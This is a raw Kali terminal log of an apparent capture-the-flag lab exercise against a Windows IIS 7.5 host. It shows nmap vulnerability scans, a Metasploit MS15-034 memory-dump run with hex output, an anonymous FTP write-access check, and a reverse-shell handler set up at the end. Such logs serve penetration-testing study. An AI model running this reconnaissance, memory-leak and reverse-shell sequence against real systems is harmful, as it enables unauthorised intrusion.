hippoeug@kali:~$ nmap --script vuln 10.129.123.159 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:04 +08
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:04
Completed NSE at 15:04, 10.03s elapsed
Initiating NSE at 15:04
Completed NSE at 15:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:04
Completed Parallel DNS resolution of 1 host. at 15:04, 0.11s elapsed
Initiating Connect Scan at 15:04
Scanning 10.129.123.159 [1000 ports]
Discovered open port 21/tcp on 10.129.123.159
Discovered open port 80/tcp on 10.129.123.159
Completed Connect Scan at 15:05, 22.46s elapsed (1000 total ports)
Initiating Service scan at 15:05
Scanning 2 services on 10.129.123.159
Completed Service scan at 15:05, 6.91s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.123.159.
Initiating NSE at 15:05
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 15:22, 1012.02s elapsed
Initiating NSE at 15:22
NSE: [tls-ticketbleed] Not running due to lack of privileges.
Completed NSE at 15:22, 1.67s elapsed
Nmap scan report for 10.129.123.159
Host is up (0.40s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1053.73 seconds
hippoeug@kali:~$ nmap  10.129.123.159 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 15:23 +08
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:23
Completed NSE at 15:23, 0.00s elapsed
Initiating NSE at 15:23
Completed NSE at 15:23, 0.00s elapsed
Initiating NSE at 15:23
Completed NSE at 15:23, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:23
Completed Parallel DNS resolution of 1 host. at 15:23, 0.11s elapsed
Initiating Connect Scan at 15:23
Scanning 10.129.123.159 [1000 ports]
Discovered open port 80/tcp on 10.129.123.159
Discovered open port 21/tcp on 10.129.123.159
Completed Connect Scan at 15:23, 21.34s elapsed (1000 total ports)
Initiating Service scan at 15:23
Scanning 2 services on 10.129.123.159
Completed Service scan at 15:23, 6.80s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.123.159.
Initiating NSE at 15:23
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Completed NSE at 15:24, 6.86s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 2.72s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Nmap scan report for 10.129.123.159
Host is up (0.39s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds
hippoeug@kali:~$ 









hippoeug@kali:~$ nmap --script vuln 10.129.128.62 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 17:53 +08
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:53
Completed NSE at 17:53, 10.00s elapsed
Initiating NSE at 17:53
Completed NSE at 17:53, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:53
Completed Parallel DNS resolution of 1 host. at 17:53, 0.03s elapsed
Initiating Connect Scan at 17:53
Scanning 10.129.128.62 [1000 ports]
Discovered open port 80/tcp on 10.129.128.62
Discovered open port 21/tcp on 10.129.128.62
Completed Connect Scan at 17:53, 18.46s elapsed (1000 total ports)
Initiating Service scan at 17:53
Scanning 2 services on 10.129.128.62
Completed Service scan at 17:53, 6.77s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.128.62.
Initiating NSE at 17:53
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 18:06, 783.02s elapsed
Initiating NSE at 18:06
NSE: [tls-ticketbleed] Not running due to lack of privileges.
Completed NSE at 18:06, 1.22s elapsed
Nmap scan report for 10.129.128.62
Host is up (0.31s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 820.02 seconds
hippoeug@kali:~$ 







hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > show options

Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------                                                                                                           
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             80               yes       The target port (TCP)
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
   TARGETURI         /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)
   THREADS           1                yes       The number of concurrent threads (max one per host)
   VHOST                              no        HTTP server virtual host

msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > set rhost 10.129.128.62
rhost => 10.129.128.62
msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > run
/usr/share/metasploit-framework/modules/auxiliary/scanner/http/ms15_034_http_sys_memory_dump.rb:67: warning: URI.escape is obsolete

[+] Target may be vulnerable...
[+] Stand by...
[-] Memory dump start position not found, dumping all data instead

[+] Memory contents:
48 54 54 50 2f 31 2e 31 20 32 30 36 20 50 61 72    |HTTP/1.1 206 Par|
74 69 61 6c 20 43 6f 6e 74 65 6e 74 0d 0a 43 6f    |tial Content..Co|
6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74    |ntent-Type: text|
2f 68 74 6d 6c 0d 0a 4c 61 73 74 2d 4d 6f 64 69    |/html..Last-Modi|
66 69 65 64 3a 20 46 72 69 2c 20 31 37 20 4d 61    |fied: Fri, 17 Ma|
72 20 32 30 31 37 20 31 34 3a 33 37 3a 33 30 20    |r 2017 14:37:30 |
47 4d 54 0d 0a 41 63 63 65 70 74 2d 52 61 6e 67    |GMT..Accept-Rang|
65 73 3a 20 62 79 74 65 73 0d 0a 45 54 61 67 3a    |es: bytes..ETag:|
20 22 33 37 62 35 65 64 31 32 63 39 66 64 32 31    | "37b5ed12c9fd21|
3a 30 22 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |:0"..Server: Mic|
72 6f 73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a    |rosoft-IIS/7.5..|
58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41 53    |X-Powered-By: AS|
50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 53 75 6e    |P.NET..Date: Sun|
2c 20 31 31 20 41 70 72 20 32 30 32 31 20 31 30    |, 11 Apr 2021 10|
3a 30 31 3a 30 39 20 47 4d 54 0d 0a 43 6f 6e 74    |:01:09 GMT..Cont|
65 6e 74 2d 4c 65 6e 67 74 68 3a 20 36 38 38 0d    |ent-Length: 688.|
0a 43 6f 6e 74 65 6e 74 2d 52 61 6e 67 65 3a 20    |.Content-Range: |
62 79 74 65 73 20 31 2d 36 38 38 2f 36 38 39 0d    |bytes 1-688/689.|
0a 0d 0a 21 44 4f 43 54 59 50 45 20 68 74 6d 6c    |...!DOCTYPE html|
20 50 55 42 4c 49 43 20 22 2d 2f 2f 57 33 43 2f    | PUBLIC "-//W3C/|
2f 44 54 44 20 58 48 54 4d 4c 20 31 2e 30 20 53    |/DTD XHTML 1.0 S|
74 72 69 63 74 2f 2f 45 4e 22 20 22 68 74 74 70    |trict//EN" "http|
3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f 54 52    |://www.w3.org/TR|
2f 78 68 74 6d 6c 31 2f 44 54 44 2f 78 68 74 6d    |/xhtml1/DTD/xhtm|
6c 31 2d 73 74 72 69 63 74 2e 64 74 64 22 3e 0d    |l1-strict.dtd">.|
0a 3c 68 74 6d 6c 20 78 6d 6c 6e 73 3d 22 68 74    |.<html xmlns="ht|
74 70 3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f    |tp://www.w3.org/|
31 39 39 39 2f 78 68 74 6d 6c 22 3e 0d 0a 3c 68    |1999/xhtml">..<h|
65 61 64 3e 0d 0a 3c 6d 65 74 61 20 68 74 74 70    |ead>..<meta http|
2d 65 71 75 69 76 3d 22 43 6f 6e 74 65 6e 74 2d    |-equiv="Content-|
54 79 70 65 22 20 63 6f 6e 74 65 6e 74 3d 22 74    |Type" content="t|
65 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65    |ext/html; charse|
74 3d 69 73 6f 2d 38 38 35 39 2d 31 22 20 2f 3e    |t=iso-8859-1" />|
0d 0a 3c 74 69 74 6c 65 3e 49 49 53 37 3c 2f 74    |..<title>IIS7</t|
69 74 6c 65 3e 0d 0a 3c 73 74 79 6c 65 20 74 79    |itle>..<style ty|
70 65 3d 22 74 65 78 74 2f 63 73 73 22 3e 0d 0a    |pe="text/css">..|
3c 21 2d 2d 0d 0a 62 6f 64 79 20 7b 0d 0a 09 63    |<!--..body {...c|
6f 6c 6f 72 3a 23 30 30 30 30 30 30 3b 0d 0a 09    |olor:#000000;...|
62 61 63 6b 67 72 6f 75 6e 64 2d 63 6f 6c 6f 72    |background-color|
3a 23 42 33 42 33 42 33 3b 0d 0a 09 6d 61 72 67    |:#B3B3B3;...marg|
69 6e 3a 30 3b 0d 0a 7d 0d 0a 0d 0a 23 63 6f 6e    |in:0;..}....#con|
74 61 69 6e 65 72 20 7b 0d 0a 09 6d 61 72 67 69    |tainer {...margi|
6e 2d 6c 65 66 74 3a 61 75 74 6f 3b 0d 0a 09 6d    |n-left:auto;...m|
61 72 67 69 6e 2d 72 69 67 68 74 3a 61 75 74 6f    |argin-right:auto|
3b 0d 0a 09 74 65 78 74 2d 61 6c 69 67 6e 3a 63    |;...text-align:c|
65 6e 74 65 72 3b 0d 0a 09 7d 0d 0a 0d 0a 61 20    |enter;...}....a |
69 6d 67 20 7b 0d 0a 09 62 6f 72 64 65 72 3a 6e    |img {...border:n|
6f 6e 65 3b 0d 0a 7d 0d 0a 0d 0a 2d 2d 3e 0d 0a    |one;..}....-->..|
3c 2f 73 74 79 6c 65 3e 0d 0a 3c 2f 68 65 61 64    |</style>..</head|
3e 0d 0a 3c 62 6f 64 79 3e 0d 0a 3c 64 69 76 20    |>..<body>..<div |
69 64 3d 22 63 6f 6e 74 61 69 6e 65 72 22 3e 0d    |id="container">.|
0a 3c 61 20 68 72 65 66 3d 22 68 74 74 70 3a 2f    |.<a href="http:/|
2f 67 6f 2e 6d 69 63 72 6f 73 6f 66 74 2e 63 6f    |/go.microsoft.co|
6d 2f 66 77 6c 69 6e 6b 2f 3f 6c 69 6e 6b 69 64    |m/fwlink/?linkid|
3d 36 36 31 33 38 26 61 6d 70 3b 63 6c 63 69 64    |=66138&amp;clcid|
3d 30 78 34 30 39 22 3e 3c 69 6d 67 20 73 72 63    |=0x409"><img src|
3d 22 77 65 6c 63 6f 6d 65 2e 70 6e 67 22 20 61    |="welcome.png" a|
6c 74 3d 22 49 49 53 37 22 20 77 69 64 74 68 3d    |lt="IIS7" width=|
22 35 37 31 22 20 68 65 69 67 68 74 3d 22 34 31    |"571" height="41|
31 22 20 2f 3e 3c 2f 61 3e 0d 0a 3c 2f 64 69 76    |1" /></a>..</div|
3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
6d 6c 3e                                           |ml>|


[+] Memory dump saved to /home/hippoeug/.msf4/loot/20210411175954_default_10.129.128.62_iis.ms15034_109815.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) > 






hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ftp/anonymous) > set rhost 10.129.128.62
rhost => 10.129.128.62
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 10.129.128.62:21      - 10.129.128.62:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[*] 10.129.128.62:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/anonymous) > 








msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 10.129.128.62
lhost => 10.129.128.62
msf6 exploit(multi/handler) > run

[-] Handler failed to bind to 10.129.128.62:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > set lhost 10.10.14.41
lhost => 10.10.14.41
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.41:4444 











